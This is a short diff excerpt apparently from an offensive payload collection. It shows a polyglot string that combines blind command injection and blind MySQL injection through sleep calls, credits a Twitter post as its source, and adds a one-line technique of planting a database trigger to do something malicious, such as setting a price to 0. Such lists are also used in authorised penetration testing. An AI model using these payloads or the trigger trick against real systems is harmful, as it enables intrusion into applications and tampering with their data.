@@ -17,3 +17,6 @@ Combines blind command injection and blind sql injection ( mysql ) in one payloa
 /*$(sleep 5)`sleep 5``*/sleep(5)#'/*$(sleep 5)`sleep 5` #*/||sleep(5)||'"||sleep(5)||"`
 ```
 > https://mobile.twitter.com/bl4ckh4ck5/status/1100167033407320065
+
+# Techniques
+- Add a trigger to do a malicious action (price 0)
